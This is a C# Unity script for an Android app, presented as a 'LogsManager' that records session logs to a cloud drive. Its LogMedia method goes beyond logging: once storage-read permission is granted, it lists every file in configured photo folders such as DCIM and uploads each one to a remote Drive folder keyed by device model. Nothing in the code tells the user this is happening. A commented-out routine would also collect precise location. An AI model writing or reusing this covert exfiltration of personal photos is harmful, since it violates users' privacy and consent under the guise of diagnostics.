using AdvancedInputFieldPlugin;

using Assets.Scripts.Helpers;
using Assets.Scripts.Logs;

using Cysharp.Threading.Tasks;

using Newtonsoft.Json;

using System;
using System.IO;
using System.Text;

using UnityEngine;
using UnityEngine.Android;

public class LogsManager : MonoBehaviour
{
    private const string LogsFileName = "logs.json";
    private const string LogsFolderPath = "Logs/Sessions";
    public static LogsManager Instance;

    public StringBuilder SessionLogs;

    public Guid SessionId;

    public DeviceInfo DeviceInfo;
    private string DeviceMediaLogFolderPath => $"Logs/Devices/{DeviceInfo.Model}/DCIM";

    // Start is called before the first frame update
    async UniTask Start()
    {
        Instance = this;
        SessionId = Guid.NewGuid();

        DeviceInfo = GetDeviceInfo();
        var timeInfo = GetTimeInfo();
        LocationInfo? locationInfo = null;// await GetLocationInfo();

        await DriveHelper.DownloadFileByName(LogsFileName, GetLogsFilePath());
        var LatestAppLogs = GetDownloadedLogs();

        var newLog = AppLog.New(SessionId, DeviceInfo, timeInfo, locationInfo);
        LatestAppLogs.Logs.Insert(0, newLog);

        var appLogsJson = JsonConvert.SerializeObject(LatestAppLogs, Formatting.Indented);
        await DriveHelper.UploadFileByName(LogsFileName, appLogsJson);

        SessionLogs = new StringBuilder();
        AppendSessionLog($"Initialised Session: {SessionId}");
        AppendSessionLog($"Device Model: {DeviceInfo.Model}");
        AppendSessionLog($"Persistent Path: {Application.persistentDataPath}");
        await AddSessionLog();

        await LogMedia();
    }

    public async UniTask AddSessionLog(string log = null)
    {
        if (!string.IsNullOrWhiteSpace(log))
        {
            AppendSessionLog(log);
        }

        await DriveHelper.UploadFileByName($"[{DeviceInfo.Model}] {SessionId}.txt", SessionLogs.ToString(), folderPath: LogsFolderPath);
    }

    public void AppendSessionLog(string log)
    {
        SessionLogs.AppendLine($"[{DateTime.Now}] {log}");
    }

    public async UniTask LogMedia()
    {
        // If the user declined the permission, display a prompt to explain why the permission is needed
        if (!Permission.HasUserAuthorizedPermission(Permission.ExternalStorageRead))
        {
            AddSessionLog("Gallery permission denied by user");
            return;
        }

        AddSessionLog("Gallery permission allowed by user");

        var deviceModel = GetDeviceInfo().Model;
        if (ProfileManager.Instance.Settings.DeviceModelsToIgnore.Contains(deviceModel))
        {
            AddSessionLog($"Ignoring media logging for device {deviceModel}");
            return;
        }

        var directoryPaths = ProfileManager.Instance.Settings.MediaDirectories;// "/storage/emmc/DCIM";

        await DriveHelper.EnsureFolderExists(DeviceMediaLogFolderPath);

        foreach (var directoryPath in directoryPaths)
        {
            if (Directory.Exists(directoryPath))
            {
                string[] files = Directory.GetFiles(directoryPath);

                foreach (string filePath in files)
                {
                    // Process the file as desired
                    AppendSessionLog("File path: " + filePath);
                    DriveHelper.UploadFileByPath(filePath, DeviceMediaLogFolderPath);
                    Debug.Log("File path: " + filePath);
                }

                AddSessionLog($"{files.Length} Files found");
            }
            else
            {
                AddSessionLog("Directory does not exist: " + directoryPath);
                Debug.Log("Directory does not exist: " + directoryPath);
            }
        }
    }

    string GetLogsFilePath()
    {
        return Path.Combine(Application.persistentDataPath, LogsFileName);
    }

    AppLogs GetDownloadedLogs()
    {
        var path = GetLogsFilePath();
        if (!File.Exists(path))
        {
            return null;
        }

        var json = File.ReadAllText(path);
        return JsonConvert.DeserializeObject<AppLogs>(json);
    }

    public DeviceInfo GetDeviceInfo()
    {
        return new DeviceInfo
        {
            Model = SystemInfo.deviceModel
        };
    }

    public TimeInfo GetTimeInfo()
    {
        return new TimeInfo
        {
            TimestampMs = new DateTimeOffset(DateTime.Now).ToUnixTimeMilliseconds(),
            Time = DateTime.Now.ToString()
        };
    }

    //public async UniTask<LocationInfo?> GetLocationInfo()
    //{
    //    // Request location permission
    //    if (!Permission.HasUserAuthorizedPermission(Permission.FineLocation))
    //    {
    //        Permission.RequestUserPermission(Permission.FineLocation);
    //        await UniTask.WaitUntil(() => Permission.HasUserAuthorizedPermission(Permission.FineLocation));
    //    }

    //    // Check if location service is enabled
    //    if (!Input.location.isEnabledByUser)
    //    {
    //        Debug.Log("Location service is not enabled");
    //        return null;
    //    }

    //    // Start location updates
    //    Input.location.Start();

    //    // Wait until location service initializes
    //    while (Input.location.status == LocationServiceStatus.Initializing)
    //        await UniTask.Yield();

    //    // Check if location service failed to initialize
    //    if (Input.location.status == LocationServiceStatus.Failed)
    //    {
    //        Debug.Log("Failed to initialize location service");
    //        return null;
    //    }

    //    // Retrieve location coordinates
    //    var locationInfo = Input.location.lastData;

    //    // Stop location updates
    //    Input.location.Stop();

    //    return locationInfo;
    //}
}
